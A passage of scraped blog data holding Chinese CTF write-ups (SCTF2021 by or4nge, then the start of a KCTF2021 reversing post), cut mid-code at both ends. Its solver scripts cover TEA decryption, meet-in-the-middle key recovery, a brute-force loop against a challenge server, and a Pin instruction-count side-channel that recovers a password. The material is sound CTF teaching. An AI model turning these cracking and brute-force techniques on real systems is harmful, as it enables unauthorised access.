range(lena, lenb - 1, -1): if a \u0026amp; (1 \u0026lt;\u0026lt; i - 1) != 0: a ^= (b \u0026lt;\u0026lt; i - lenb) return GF2(a) def __pow__(self, other, modulo = None): d = GF2(1) while other \u0026gt; 0: if other \u0026amp; 1: d = d * self if modulo != None: d %= modulo other \u0026gt;\u0026gt;= 1 self *= self if modulo != None: self %= modulo return d tea.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt;  //加密函数 void encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=1935897702; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i \u0026lt; 32; i++) { /* basic cycle start */ sum += delta; v0 += (sum + i )^(((v1\u0026lt;\u0026lt;4) + k2) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k3)); v1 += (sum + i )^(((v0\u0026lt;\u0026lt;4) + k0) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k1)); } /* end cycle */ v[0]=v0; v[1]=v1; } //解密函数 void decrypt (uint32_t* v, uint32_t* k) { uint32_t delta=1935897702; /* a key schedule constant */ uint32_t v0=v[0], v1=v[1], sum=delta * 32; int i; /* set up */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=31; i\u0026gt;=0; i--) { /* basic cycle start */ v1 -= (sum + i )^(((v0\u0026lt;\u0026lt;4) + k0) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k1)); v0 -= (sum + i )^(((v1\u0026lt;\u0026lt;4) + k2) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k3)); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; } int main(){ v[0] = \u0026#39;s\u0026#39; ^ 0x66666666 ^ 2650095043; v[1] = \u0026#39;c\u0026#39; ^ 0x66666666 ^ 1257176610; v[2] = \u0026#39;t\u0026#39; ^ 0x66666666 ^ 407123268; v[3] = \u0026#39;f\u0026#39; ^ 0x66666666 ^ 3718944108; v[4] = \u0026#39;s\u0026#39; ^ 0x66666666 ^ 703929021; v[5] = \u0026#39;c\u0026#39; ^ 0x66666666 ^ 1889742860; v[6] = \u0026#39;t\u0026#39; ^ 2436073003 ^ 0x66666666; v[7] = \u0026#39;f\u0026#39; ^ 2423013887 ^ 0x66666666; decrypt(v, k); decrypt(v+2, k); decrypt(v+4, k); decrypt(v+6, k); printf(\u0026#34;0x%x, 0x%x, \u0026#34;,v[0],v[1]); printf(\u0026#34;0x%x, 0x%x, \u0026#34;,v[2],v[3]); printf(\u0026#34;0x%x, 0x%x, \u0026#34;,v[4],v[5]); printf(\u0026#34;0x%x, 0x%x\\n\u0026#34;,v[6],v[7]); return 0; } SycOS riscv 架构，ghidra 打开\n读取 0x40 长度，每个字符分别计算 0x80 次线性同余方程，然后分两部分存储\n0x10 轮加密，依次进行：tea 运算、两部分中各取出 0x100 进行交换，然后进行系统调用，动调发现内核中的处理只是把两部分字符串做了交换\n 系统调用可以根据 \u0026ldquo;sys call\u0026rdquo; 字符串定位到\n tea 的加密一个是 16 轮的一个是 8 轮\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026#34;exp.h\u0026#34;int delta=-0x61c88647; char str[65]; char tmp[256]; char tmp1[4096]; unsigned long long seed; unsigned long long mRand() { seed=seed*0x41c64e6d+0x3039; return (seed\u0026lt;\u0026lt;0x21)\u0026gt;\u0026gt;0x31; } void tea1(char *str) { for (int j=0;j\u0026lt;4096;j+=8) { auto *ptr=(unsigned int*)(str+j); auto t1=ptr[0]; auto t2=ptr[1]; int sum=delta*16; for (int k=0;k\u0026lt;16;k++) { t2 -= t1 + sum ^ (t1\u0026lt;\u0026lt;4) + 0x1A2B3C4D ^ (t1 \u0026gt;\u0026gt; 5) + 0xCC1122AA; t1 -= (t2\u0026lt;\u0026lt;4) + 0x11222233 ^ (t2 \u0026gt;\u0026gt; 5) + 0xaabbccdd ^ sum +t2; sum-=delta; } ptr[0]=t1; ptr[1]=t2; } } void tea2(char* str) { for (int j=0;j\u0026lt;4096;j+=8) { auto *ptr=(unsigned int*)(str+j); auto t1=ptr[0]; auto t2=ptr[1]; int sum=delta*8; for (int k=0;k\u0026lt;8;k++) { sum-=delta; t1 += t2 + sum ^ (t2 \u0026lt;\u0026lt;4) + 0x11222233 ^ (t2 \u0026gt;\u0026gt; 5) + 0xaabbccdd; t2 +=(t1\u0026lt;\u0026lt;4) + 0x1A2B3C4D ^ (t1 \u0026gt;\u0026gt; 5) + 0xCC1122AA ^ sum +t1; } ptr[0]=t1; ptr[1]=t2; } } void panic() { printf(\u0026#34;failed\u0026#34;); exit(0); } int main() { for (int i=15;i\u0026gt;=0;i--) { memcpy(tmp1,target1,4096); memcpy(target1,target2,4096); memcpy(target2,tmp1,4096); memcpy(tmp,target1+(i*256),256); memcpy(target1+(i*256),target2+(15-i)*256,256); memcpy(target2+(15-i)*256,tmp,256);\ttea1(target1); tea2(target2); } for (int i=0;i\u0026lt;0x80;i++) printf(\u0026#34;0x%02x \u0026#34;,(unsigned char)target2[i]); printf(\u0026#34;\\n\\n\u0026#34;); for (int i=0;i\u0026lt;0x20;i++) { int an=0; for (an=i;an\u0026lt;i+0xff;an++) { seed=an; bool ch=true; for (int j=0;j\u0026lt;0x80;j++) { unsigned char aa=mRand()\u0026amp;0xff; unsigned char bb=target1[i*0x80+j]\u0026amp;0xff; if (aa!=bb) { ch=false; break; } } if (ch) break; } printf(\u0026#34;%x\\n\u0026#34;,an); if (an\u0026gt;=0xff) { panic(); } str[i]=an-i; } for (int i=0;i\u0026lt;0x20;i++) { int an=0; for (an=i;an\u0026lt;i+0xff;an++) { seed=an; bool ch=true; for (int j=0;j\u0026lt;0x80;j++) { unsigned char aa=mRand()\u0026amp;0xff; unsigned char bb=target2[i*0x80+j]\u0026amp;0xff; if (aa!=bb) { ch=false; break; } } if (ch) break; } printf(\u0026#34;%x\\n\u0026#34;,an); if (an\u0026gt;=0xff) { panic(); } str[i+0x20]=an-i; } printf(\u0026#34;%s\\n\u0026#34;,str); return 0; } SycGame 推箱子游戏\ngithub 找了个自动求解脚本，然后在脚本里加一个 alarm，求解一次的时间超过 3s 就自动退出\nhttps://github.com/tonyling/skb-solver\n题目的程序和 github 上的脚本写的都有点问题，最后大概是脚本有 1/5 到 1/10 的概率求解出一轮，接下来爆破一波就行（服务器第一天不太稳定，爆破完不回显 flag\u0026hellip;）\nfrom pwn import * from sympy.ntheory.modular import isprime import traceback context.log_level=\u0026#39;debug\u0026#39; def bprint(lst): for i in lst: for j in i: print(\u0026#34;%4d\u0026#34;%j,end=\u0026#39;\u0026#39;) print(\u0026#39;\u0026#39;) def fprint(lst): mpc={1:\u0026#39; \u0026#39;,0:\u0026#39;#\u0026#39;,-2:\u0026#39;@\u0026#39;,-3:\u0026#39;.\u0026#39;,-1:\u0026#39;$\u0026#39;} target=\u0026#39;20\\n\u0026#39; for i in lst: for j in i: target+=(\u0026#34;%c\u0026#34;%mpc[j]) target+=\u0026#34;\\n\u0026#34; open(\u0026#34;test.txt\u0026#34;,\u0026#34;w\u0026#34;).write(target) maxn=0 while (True): try: p=remote(\u0026#34;124.70.152.166\u0026#34;,1448) p.recvuntil(b\u0026#34;:\u0026#34;) p.send(b\u0026#34;Y\\n\u0026#34;) for i in range(4): p.recvuntil(b\u0026#34;\\n\u0026#34;) buffer=p.recvuntil(b\u0026#34;\\n\u0026#34;).decode()[:-2] _mp=list(map(int,buffer.split(\u0026#34; \u0026#34;))) mp0=[(0 if isprime(i) else 1) if i\u0026gt;0 else i for i in _mp] mp=[[mp0[i*20+j] for j in range(20)]for i in range(20)] mpback=[[mp0[i*20+j] for j in range(20)]for i in range(20)] bprint(mp) fprint(mp) data=os.popen(\u0026#39;./a.out test.txt\u0026#39;).read() print(data) p.send(data.encode()) p.recvuntil(\u0026#34;:\u0026#34;) p.send(b\u0026#34;Y\\n\u0026#34;) rec=p.recvuntil(\u0026#34;\\n\u0026#34;) print(rec) maxn=max(maxn,i+1) i=4 p.recvuntil(b\u0026#34;\\n\u0026#34;) buffer=p.recvuntil(b\u0026#34;\\n\u0026#34;).decode()[:-2] _mp=list(map(int,buffer.split(\u0026#34; \u0026#34;))) mp0=[(0 if isprime(i) else 1) if i\u0026gt;0 else i for i in _mp] mp=[[mp0[i*20+j] for j in range(20)]for i in range(20)] mpback=[[mp0[i*20+j] for j in range(20)]for i in range(20)] bprint(mp) fprint(mp) data=os.popen(\u0026#39;./a.out test.txt\u0026#39;).read() print(data) p.send(data.encode()) dt=p.recvuntil(b\u0026#34;Y\u0026#34;) print(\u0026#34;recieved:\u0026#34;,end=\u0026#39;\u0026#39;) print(dt) i=5 p.interactive() except: if (i==4): traceback.print_exc() if (i==5): break p.close() print(\u0026#34;maxn:%d\u0026#34;%maxn) pass Crypto ciruit map 是个混淆电路，目标 flag 最终就是要求出 keys\n电路中多给了一个值是 validation，用这个值可以构造中间相遇攻击，从而将秘钥爆破空间缩小到 2**24，pypy3 跑然后在密钥空间中验证电路是否能通，能通的就是正确的秘钥\nfrom block_cipher import encrypt_data, decrypt_data, decrypt from collections import defaultdict from tqdm import tqdm G_Table = { 5: [(13303835, 2123830), (2801785, 11303723), (13499998, 248615), (13892520, 7462011)], 6: [(3244202, 918053), (3277177, 6281266), (1016382, 7097624), (10016472, 13600867)], 7: [(5944875, 3442862), (7358369, 8423543), (6495696, 9927178), (13271900, 11855272)], 9: [(5333988, 87113), (9375869, 11687470), (5011062, 14981756), (2509493, 12330305)]} print(\u0026#39;[!] generating lookup table...\u0026#39;) ENCRYPTIONS_OF_ZERO = defaultdict(list) for key in tqdm(range(2**24)): ct = encrypt_data(0, key) ENCRYPTIONS_OF_ZERO[ct].append(key) def meet_in_the_middle(ct): print(\u0026#39;[!] performing meet-in-the-middle attack for\u0026#39;, ct) possible = defaultdict(list) for key in tqdm(range(2**24)): dec = decrypt_data(ct, key) if dec in ENCRYPTIONS_OF_ZERO: possible[key] = ENCRYPTIONS_OF_ZERO[dec] return possible def recover_keys(Z, C): print(\u0026#39;[!] recovering keys...\u0026#39;) z1, z2, z3, z4 = Z c1, c2, c3, c4 = C for b0 in tqdm(z1): for a0 in z1[b0]: p1 = decrypt(c1, a0, b0) for c,z in zip([c2, c3, c4], [z2, z3, z4]): for a1 in z[b0]: if p1 == decrypt(c, a1, b0): b1 = recover_keys_part2(Z, C, a0, b0) if b1: print(c1) print(c) print(f\u0026#39;a0 = {a0}, b0 = {b0}\u0026#39;) print(f\u0026#39;a1 = {a1}, b1 = {b1}\u0026#39;) return True return False def recover_keys_part2(Z, C, a0, b0): z1, z2, z3, z4 = Z c1, c2, c3, c4 = C for c,z in zip([c2,c3,c4], [z2,z3,z4]): for b1 in z: if a0 in z[b1] and decrypt(c, a0, b1) == decrypt(c1, a0, b0): return b1 return False # Z是四个字典，键是key2, 值是key1 for i in [7]: Z = [meet_in_the_middle(G_Table[i][j][1]) for j in range(4)] C = [g[0] for g in G_Table[i]] for i in range(4): if recover_keys([Z[i]] + Z[:i] + Z[i+1:], [C[i]] + C[:i] + C[i+1:]): break ############################################################### from block_cipher import decrypt G_Table = { 5: [(13303835, 2123830), (2801785, 11303723), (13499998, 248615), (13892520, 7462011)], 6: [(3244202, 918053), (3277177, 6281266), (1016382, 7097624), (10016472, 13600867)], 7: [(5944875, 3442862), (7358369, 8423543), (6495696, 9927178), (13271900, 11855272)], 9: [(5333988, 87113), (9375869, 11687470), (5011062, 14981756), (2509493, 12330305)]} def validate_the_circuit(geta_table, key0, key1): for g in geta_table: gl, v = g label = decrypt(gl, key0, key1) validation = decrypt(v, key0, key1) if validation == 0: return label geta5 = G_Table[5] geta6 = G_Table[6] geta7 = G_Table[7] geta9 = G_Table[9] key0 = 8680011 key1 = 2096572 msg = validate_the_circuit(geta9, key0, key1) print(\u0026#39;key[9][1] = \u0026#39;, msg) # keys[1][0] = 8343801 # keys[1][1] = 13675268 # keys[2][0] = 10251687 # keys[2][1] = 12870274 # keys[3][0] = 6827786 # keys[3][1] = 12490757 # keys[4][0] = 2096572 # keys[4][1] = 3391233 # keys[5][0] = 15707475 # keys[5][1] = 4567418 # keys[6][0] = 14095476 # keys[6][1] = 3648155 # key[7][0] = 14409690 # key[7][1] = 8680011 # key[9][0] = 9376523 # key[9][1] = 2504390 ############################################################### import hashlib from Crypto.Util.number import * from libnum import n2s # keys[1][0] = 8343801 # keys[1][1] = 13675268 # keys[2][0] = 10251687 # keys[2][1] = 12870274 # keys[3][0] = 6827786 # keys[3][1] = 12490757 # keys[4][0] = 2096572 # keys[4][1] = 3391233 # keys[5][0] = 15707475 # keys[5][1] = 4567418 # keys[6][0] = 14095476 # keys[6][1] = 3648155 # keys[7][0] = 14409690 # keys[7][1] = 8680011 # keys[9][0] = 9376523 # keys[9][1] = 2504390 keys = [[8343801, 13675268], [10251687, 12870274], [6827786, 12490757], [2096572, 3391233], [15707475, 4567418], [14095476, 3648155], [14409690, 8680011], [9376523, 2504390]] def xor(A, B): return bytes(a ^ b for a, b in zip(A, B)) the_chaos=b\u0026#39;\u0026#39; for i in keys: tmp = sum(i) the_chaos += bytes(long_to_bytes(tmp)) mask = hashlib.md5(the_chaos).digest() flag = xor(mask,n2s(0x1661fe85c7b01b3db1d432ad3c5ac83a)) print(flag) Misc This_is_A_tree 一个树型解密，随便找了个脚本改了改\n#!/usr/bin/python  # -*- coding:utf8 -*-  import os allFileNum = 0 file_contents_list = [] def printPath(level, path): global allFileNum # 所有文件夹，第一个字段是次目录的级别  dirList = [] # 所有文件  fileList = [] # exp global file_contents_list # exp # 返回一个列表，其中包含在目录条目的名称(google翻译)  files = os.listdir(path) # 先添加目录级别  dirList.append(str(level)) for f in files: if(os.path.isdir(path + \u0026#39;/\u0026#39; + f)): # 排除隐藏文件夹。因为隐藏文件夹过多  if(f[0] == \u0026#39;.\u0026#39;): pass else: # 添加非隐藏文件夹  dirList.append(f) if(os.path.isfile(path + \u0026#39;/\u0026#39; + f)): # 添加文件 fileList.append(f) # exp添加内容 if f != \u0026#39;exp.py\u0026#39;: file_contents_list.append(open(path + \u0026#39;\\\\\u0026#39; + f, \u0026#39;r\u0026#39;).read()) # exp # 当一个标志使用，文件夹列表第一个级别不打印  i_dl = 0 for dl in dirList: if(i_dl == 0): i_dl = i_dl + 1 else: # 打印至控制台，不是第一个的目录  print(\u0026#39;-\u0026#39; * (int(dirList[0])), dl) # 打印目录下的所有文件夹和文件，目录级别+1  printPath((int(dirList[0]) + 1), path + \u0026#39;/\u0026#39; + dl) for fl in fileList: # 打印文件  print(\u0026#39;-\u0026#39; * (int(dirList[0])), fl) # 随便计算一下有多少个文件  allFileNum = allFileNum + 1 return file_contents_list if __name__ == \u0026#39;__main__\u0026#39;: contents_list = printPath(1, \u0026#39;D:\\\\CTF题目\\\\2021SCTF\\\\misc\\\\78afbe21e9334e83a265e984a1aa9ddd\u0026#39;) # print(\u0026#39;总文件数 =\u0026#39;, allFileNum) print(\u0026#34;\u0026#34;.join(contents_list)) 解密完base64一下是个八卦序列，师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫 https://blog.csdn.net/weixin_44110537/article/details/107494966\n脚本如下,输入换一下，删一点后面的就行\ndef decrypt4(enc): temp=\u0026#39;\u0026#39; offset=5 for i in range(len(enc)): temp+=chr(ord(enc[i])+offset+i) return temp def decrypt5(flag): for a in range(1,200): enc = \u0026#39;\u0026#39; for i in flag: for k in range(200): if (ord(i) - 97 - 7+26*k)%a==0: enc+= chr((ord(i) - 97 - 7 + 26 * k) // a + 97) break print(enc) s=\u0026#39;师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫\u0026#39; dic={\u0026#39;坤\u0026#39;: \u0026#39;000000\u0026#39;, \u0026#39;剥\u0026#39;: \u0026#39;000001\u0026#39;, \u0026#39;比\u0026#39;: \u0026#39;000010\u0026#39;, \u0026#39;观\u0026#39;: \u0026#39;000011\u0026#39;, \u0026#39;豫\u0026#39;: \u0026#39;000100\u0026#39;, \u0026#39;晋\u0026#39;: \u0026#39;000101\u0026#39;, \u0026#39;萃\u0026#39;: \u0026#39;000110\u0026#39;, \u0026#39;否\u0026#39;: \u0026#39;000111\u0026#39;, \u0026#39;谦\u0026#39;: \u0026#39;001000\u0026#39;, \u0026#39;艮\u0026#39;: \u0026#39;001001\u0026#39;, \u0026#39;蹇\u0026#39;: \u0026#39;001010\u0026#39;, \u0026#39;渐\u0026#39;: \u0026#39;001011\u0026#39;, \u0026#39;小过\u0026#39;: \u0026#39;001100\u0026#39;, \u0026#39;旅\u0026#39;: \u0026#39;001101\u0026#39;, \u0026#39;咸\u0026#39;: \u0026#39;001110\u0026#39;, \u0026#39;遁\u0026#39;: \u0026#39;001111\u0026#39;, \u0026#39;师\u0026#39;: \u0026#39;010000\u0026#39;, \u0026#39;蒙\u0026#39;: \u0026#39;010001\u0026#39;, \u0026#39;坎\u0026#39;: \u0026#39;010010\u0026#39;, \u0026#39;涣\u0026#39;: \u0026#39;010011\u0026#39;, \u0026#39;解\u0026#39;: \u0026#39;010100\u0026#39;, \u0026#39;未济\u0026#39;: \u0026#39;010101\u0026#39;, \u0026#39;困\u0026#39;: \u0026#39;010110\u0026#39;, \u0026#39;讼\u0026#39;: \u0026#39;010111\u0026#39;, \u0026#39;升\u0026#39;: \u0026#39;011000\u0026#39;, \u0026#39;蛊\u0026#39;: \u0026#39;011001\u0026#39;, \u0026#39;井\u0026#39;: \u0026#39;011010\u0026#39;, \u0026#39;巽\u0026#39;: \u0026#39;011011\u0026#39;, \u0026#39;恒\u0026#39;: \u0026#39;011100\u0026#39;, \u0026#39;鼎\u0026#39;: \u0026#39;011101\u0026#39;, \u0026#39;大过\u0026#39;: \u0026#39;011110\u0026#39;, \u0026#39;姤\u0026#39;: \u0026#39;011111\u0026#39;, \u0026#39;复\u0026#39;: \u0026#39;100000\u0026#39;, \u0026#39;颐\u0026#39;: \u0026#39;100001\u0026#39;, \u0026#39;屯\u0026#39;: \u0026#39;100010\u0026#39;, \u0026#39;益\u0026#39;: \u0026#39;100011\u0026#39;, \u0026#39;震\u0026#39;: \u0026#39;100100\u0026#39;, \u0026#39;噬嗑\u0026#39;: \u0026#39;100101\u0026#39;, \u0026#39;随\u0026#39;: \u0026#39;100110\u0026#39;, \u0026#39;无妄\u0026#39;: \u0026#39;100111\u0026#39;, \u0026#39;明夷\u0026#39;: \u0026#39;101000\u0026#39;, \u0026#39;贲\u0026#39;: \u0026#39;101001\u0026#39;, \u0026#39;既济\u0026#39;: \u0026#39;101010\u0026#39;, \u0026#39;家人\u0026#39;: \u0026#39;101011\u0026#39;, \u0026#39;丰\u0026#39;: \u0026#39;101100\u0026#39;, \u0026#39;离\u0026#39;: \u0026#39;101101\u0026#39;, \u0026#39;革\u0026#39;: \u0026#39;101110\u0026#39;, \u0026#39;同人\u0026#39;: \u0026#39;101111\u0026#39;, \u0026#39;临\u0026#39;: \u0026#39;110000\u0026#39;, \u0026#39;损\u0026#39;: \u0026#39;110001\u0026#39;, \u0026#39;节\u0026#39;: \u0026#39;110010\u0026#39;, \u0026#39;中孚\u0026#39;: \u0026#39;110011\u0026#39;, \u0026#39;归妹\u0026#39;: \u0026#39;110100\u0026#39;, \u0026#39;睽\u0026#39;: \u0026#39;110101\u0026#39;, \u0026#39;兑\u0026#39;: \u0026#39;110110\u0026#39;, \u0026#39;履\u0026#39;: \u0026#39;110111\u0026#39;, \u0026#39;泰\u0026#39;: \u0026#39;111000\u0026#39;, \u0026#39;大畜\u0026#39;: \u0026#39;111001\u0026#39;, \u0026#39;需\u0026#39;: \u0026#39;111010\u0026#39;, \u0026#39;小畜\u0026#39;: \u0026#39;111011\u0026#39;, \u0026#39;大壮\u0026#39;: \u0026#39;111100\u0026#39;, \u0026#39;大有\u0026#39;: \u0026#39;111101\u0026#39;, \u0026#39;夬\u0026#39;: \u0026#39;111110\u0026#39;, \u0026#39;乾\u0026#39;: \u0026#39;111111\u0026#39;} li=[] k=0 for i in range(len(s)): if k ==1: k=0 continue try: li.append(dic[s[i]]) except: t=\u0026#39;\u0026#39; t=t+s[i]+s[i+1] li.append(dic[t]) k=1 ss=\u0026#39;\u0026#39;.join(li) print(ss) enc=\u0026#39;\u0026#39; for i in range(0,len(ss),8): enc+=chr(eval(\u0026#39;0b\u0026#39;+ss[i:i+8])) import base64 print(enc) x=base64.b64decode(enc).decode() print(x) x=decrypt4(x) x=decrypt5(x) fumo_xor_cli nc 远程发现是通过五颜六色的字符打印出一个 gif，肉眼发现有两帧不一样，把 nc 到的字节流重定向到本地文件，然后手动把这两帧提取出来，都是 50*133 个字符的。\n\r\n无意间发现链接的公众号推送的最后一张图有异样，下载原图，仔细观察发现：\n\r\n有规律的藏有五颜六色的像素，提取出来，发现是 133*100 的，把这个拆成两个 50*133 ，然后都旋转为正的，将 4 张 50*133 的图异或，发现大部分都是 (0,0,0)，部分是三个一样的，再经过一些简单的图片处理，得到flag。\n\r\n全程处理数据的脚本：\nfrom PIL import Image import numpy as np def rerange(s): t = [] for i in range(len(s[0])): t.append([s[_][i] for _ in range(len(s))]) return t f = Image.open(\u0026#39;640.png\u0026#39;) a = np.array(f) cnt = 0 wx_list_1 = [] wx_list_2 = [] for i in range(len(a)): if i % 9 == 1 and i \u0026lt; 1190: b = a[i] now_list_1 = [] now_list_2 = [] cnt_j = 0 for j in range(len(b)): if j % 9 == 1: if cnt_j \u0026lt; 50: now_list_1.append(b[j]) else: now_list_2.append(b[j]) cnt_j += 1 wx_list_1.append(now_list_1) wx_list_2.append(now_list_2) cnt += 1 wx_list_1 = rerange(wx_list_1) wx_list_2 = rerange(wx_list_2) import re fp = open(\u0026#39;pic1.txt\u0026#39;, \u0026#39;rb\u0026#39;) list_1 = [] for line in fp.readlines(): pattern = re.compile(r\u0026#39;\\[\\d+;\\d+;(\\d+);(\\d+);(\\d+)ma\u0026#39;) a = pattern.findall(line.decode()) a = [(int(_[0]), int(_[1]), int(_[2])) for _ in a] list_1.append(a) fp.close() fp = open(\u0026#39;pic2.txt\u0026#39;, \u0026#39;rb\u0026#39;) list_2 = [] for line in fp.readlines(): pattern = re.compile(r\u0026#39;\\[\\d+;\\d+;(\\d+);(\\d+);(\\d+)m[a-zA-Z0-9\\:\\/\\.\\_]\u0026#39;) a = pattern.findall(line.decode()) a = [(int(_[0]), int(_[1]), int(_[2])) for _ in a] list_2.append(a) fp.close() fp = open(\u0026#39;pic3\u0026#39;, \u0026#39;wb\u0026#39;) for i in range(len(list_1)): a, b = wx_list_1[i], list_1[i] c, d = wx_list_2[i], list_2[i] for j in range(len(a)): r1, g1, b1 = a[j] r2, g2, b2 = b[j] r3, g3, b3 = c[j] r4, g4, b4 = d[j] r0 = r2 ^ r1 ^ r3 ^ r4 g0 = g2 ^ g1 ^ g3 ^ g4 b0 = b2 ^ b1 ^ b3 ^ b4 if r0 != 0: r0, b0, g0 = 255, 255, 255 # # c0 = chr(ord(c1) ^ ord(c2)) payload = \u0026#39;[38;2;%d;%d;%dm▇\u0026#39; % (r0, g0, b0) fp.write(b\u0026#39;\\x1b\u0026#39; + payload.encode()) fp.write(\u0026#39;\\n\u0026#39;.encode()) in_the_vaporwaves 用国赛的华为音响播放（应该是个非预期）直接听到了莫斯码，录音下来的结果\n\r\n摩斯码：\n.../-.-./-/..-./-.././.../.----/.-./...--/..--.-/-../.-./../...-/./.../..--.-/../-./-/-----/..--.-/...-/.-/.--./---/.-./.--/.--.-./...-/./... 解莫斯码得到flag\nlow_re vmp 壳，根据题目描述，应该无法逆向出正确的逻辑，什么信息都没有的情况下想到用 pintools 来试试，手动尝试发现长度是 17 位，并且指令数量差异很明显\n按位爆破：\nimport subprocess import string password = \u0026#34;S1deCh4nnelAtt@ck\u0026#34; cur = 17 charset = string.digits + string.ascii_letters + string.punctuation for i in charset: command = \u0026#34;echo \u0026#34; + password[:cur] + i + password[cur + 1:] + \u0026#34; | ./pin.exe -t source/tools/ManualExamples/obj-intel64/inscount0.dll -- ./low_re.exe; cat inscount.out\u0026#34; output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE) print (password[:cur] + i, output) 指令数量差异很明显，可以直接猜测单词加快速度\n\r\n","date":"2021-12-28T16:23:17+08:00","image":"https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/cover_hu20e70d2f1ec0ceae4e2274ecf0db6e8c_615875_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/","title":"SCTF2021 Writeup by or4nge"},{"content":"转载自战队成员博客: https://s0uthwood.github.io/post/two-challenges-in-kctf2021-fall/\n第一题 签到 这题还是比较容易的，需要一点点动调的经验\n上张队友的截图吧，懒得自己截了\n\r\n动调看看内存就知道，流程是：\nserial-\u0026gt;十进制-\u0026gt;与name的crc异或-\u0026gt;计算crc\n最后需要是一个固定的值，于是只需要想办法反解就行了\n这里注意到了一个事情，那就是图中看似是对 v6 的 crc 结果做了约束，其实是对 v6 本身进行了约束\n由于题目给了一个实例的 name 和 serial，我们只需要动调拿到这个的 v6，就知道能通过验证的 v6 是多少了\n接下来动调拿一下 KCTF 的 crc，这个的结果再异或一下目标的 v6，就得到serial了\n 靠记忆写的，希望没错\n 第二题 迷失丛林  这题就直接放提交的wp了\n 很容易定位到程序的输入\n\r\n输入长度为32，需要通过 sub_4014A0, sub_401580 的验证\n4014A0 较为简单，是个经典的hexstr转成char存到 4041F0 这个地址，最后的16是计算转换后的长度，所以输入就是 [0-9A-F]{32}\n随后将输入的前八字节存入 404000 中，剩下的部分传参进 sub_401580\n要想让该函数返回1，需要先通过如下的if验证\n\r\n简单看一下使用的变量，应该是对前八字节的输入进行的验证\n\r\n结合动调发现大概就是根据404000数组，构成一个 \u0026lt;value, index\u0026gt; 的结构，两两存放到404420当中\n分析了一下404000数组的作用和特征，发现这个数组应该是构成一个环状的结构（以当前数值作为索引寻找下一个数），猜测不能有重复的数字，否则可能会构成小循环之类的，用脚本验证了一下发现后面248个数字果然没有重复，于是将前八字节的取值可能锁定到了 0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb 中，总共有 $8!=40320$ 种可能，完全可以爆破\n把ida代码复制下来改一改\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt;#include \u0026lt;algorithm\u0026gt;#include \u0026lt;cstring\u0026gt; unsigned char byte_404000[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x9B, 0xF4, 0xDF, 0xAC, 0x7C, 0xA1, 0xC6, 0x16, 0xD0, 0x0F, 0xDD, 0xDC, 0x73, 0xC5, 0x6B, 0xD1, 0x96, 0x47, 0xC2, 0x26, 0x67, 0x4E, 0x41, 0x82, 0x20, 0x56, 0x9A, 0x6E, 0x33, 0x92, 0x88, 0x29, 0xB5, 0xB4, 0x71, 0xA9, 0xCE, 0xC3, 0x34, 0x50, 0x59, 0xBF, 0x2D, 0x57, 0x22, 0xA6, 0x30, 0x04, 0xB2, 0xCD, 0x36, 0xD5, 0x68, 0x4D, 0x5B, 0x45, 0x9E, 0x85, 0xCF, 0x9D, 0xCC, 0x61, 0x78, 0x32, 0x76, 0x31, 0xE3, 0x80, 0xAD, 0x39, 0x4F, 0xFA, 0x72, 0x83, 0x4C, 0x86, 0x60, 0xB7, 0xD7, 0x63, 0x0C, 0x44, 0x35, 0xB3, 0x7B, 0x19, 0xD4, 0x69, 0x08, 0x0B, 0x1F, 0x3D, 0x11, 0x79, 0xD3, 0xEE, 0x93, 0x42, 0xDE, 0x23, 0x3B, 0x5D, 0x8D, 0xA5, 0x77, 0x5F, 0x58, 0xDB, 0x97, 0xF6, 0x7A, 0x18, 0x52, 0x15, 0x74, 0x25, 0x62, 0x2C, 0x05, 0xE8, 0x0D, 0x98, 0x2A, 0x43, 0xE2, 0xEF, 0x48, 0x87, 0x49, 0x1C, 0xCA, 0x2B, 0xA7, 0x8A, 0x09, 0x81, 0xE7, 0x53, 0xAA, 0xFF, 0x6F, 0x8E, 0x91, 0xF1, 0xF0, 0xA4, 0x46, 0x3A, 0x7D, 0x54, 0xEB, 0x2F, 0xC1, 0xC0, 0x0E, 0xBD, 0xE1, 0x6C, 0x64, 0xBE, 0xE4, 0x02, 0x3C, 0x5A, 0xA8, 0x9F, 0x37, 0xAF, 0xA0, 0x13, 0xED, 0x1B, 0xEC, 0x8B, 0x3E, 0x7E, 0x27, 0x99, 0x75, 0xAB, 0xFE, 0xD9, 0x3F, 0xF3, 0xEA, 0x70, 0xF7, 0x95, 0xBA, 0x1D, 0x40, 0xB0, 0xF9, 0xE5, 0xF8, 0x06, 0xBC, 0xB6, 0x03, 0xC9, 0x10, 0x9C, 0x2E, 0x89, 0x5C, 0x7F, 0xB1, 0x1A, 0xD6, 0x90, 0xAE, 0xDA, 0xE6, 0x5E, 0xB9, 0x84, 0xE9, 0x55, 0xBB, 0xC7, 0x0A, 0xE0, 0x66, 0xF2, 0xD8, 0xCB, 0x00, 0x12, 0xB8, 0x17, 0x94, 0x6A, 0x4A, 0x01, 0x24, 0x14, 0x51, 0x07, 0x65, 0x21, 0xC8, 0x38, 0xFD, 0x8F, 0xC4, 0xF5, 0xFC }; unsigned char byte_404220[520]; unsigned char byte_404420[65537]; int dword_404100[] = {2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0}; using namespace std; int sub_401580(unsigned char *a2) { int v2; // ebp  unsigned char *v3; // eax  int 